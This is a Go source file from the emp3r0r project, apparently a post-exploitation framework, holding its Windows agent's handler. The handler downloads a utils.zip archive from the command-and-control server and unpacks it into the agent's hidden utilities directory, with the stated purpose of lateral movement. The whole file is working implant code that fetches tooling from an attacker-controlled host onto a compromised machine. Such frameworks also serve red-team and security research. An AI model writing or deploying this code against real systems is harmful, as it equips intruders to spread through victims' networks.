package agentw

//build +windows

/*
install tools to emp3r0r_data.UtilsPath, for lateral movement
*/

import (
	"fmt"
	"log"
	"os"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

func vaccineHandler() (out string) {
	log.Printf("Downloading utils.zip from %s", emp3r0r_data.CCAddress+"www/utils.zip")
	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/utils.zip", emp3r0r_data.AgentRoot+"/utils.zip")
	out = "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
		return
	}

	// unpack utils.zip to our PATH
	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
		if err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700); err != nil {
			log.Print(err)
			return fmt.Sprintf("mkdir: %v", err)
		}
	}
	if err = archiver.Unarchive(emp3r0r_data.AgentRoot+"/utils.zip", emp3r0r_data.UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
		return fmt.Sprintf("Unarchive: %v", err)
	}
	_ = os.Remove(emp3r0r_data.AgentRoot + "/utils.zip")

	return
}
